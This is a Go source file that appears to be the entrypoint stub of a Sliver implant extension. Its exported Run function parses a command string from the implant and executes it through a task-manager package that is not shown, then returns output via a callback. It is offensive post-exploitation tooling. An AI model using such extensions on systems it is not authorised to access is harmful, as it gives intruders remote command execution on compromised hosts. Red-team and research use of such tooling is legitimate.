package main

import "C"
import (
	"taskmanager/pkg/taskmanager"

	"taskmanager/pkg/parser"
)

const (
	Success = 0
	Error   = 1
)

// This is the entrypoint called by the Sliver implant at runtime.
// Arguments are passed in via the `data` parameter as a byte array of size `dataLen`.
// Use the OutputBuffer.SendOutput() and OutputBuffer.SendError() methods to
// prepare the data to be sent back to the implant.
// Data is sent with a call to OutputBuffer.Flush().

//export Run
func Run(data uintptr, dataLen uintptr, callback uintptr) uintptr {
	// Prepare the output buffer used to send data back to the implant
	outBuff := parser.NewOutBuffer(callback)
	// Create a new argument parser
	dataParser, err := parser.NewParser(data, dataLen)
	if err != nil {
		outBuff.SendError(err)
		outBuff.Flush()
	}

	// Parse arguments

	// Get a string argument that contains the command to run
	command, err := dataParser.GetString()
	if err != nil {
		outBuff.SendError(err)
		outBuff.Flush()
		return Error
	}

	output, err := taskmanager.ExecuteCommand(command)
	if err != nil {
		outBuff.SendError(err)
		outBuff.Flush()
		return Error
	}
	outBuff.SendOutput(output)
	outBuff.Flush()
	return Success
}

func main() {}
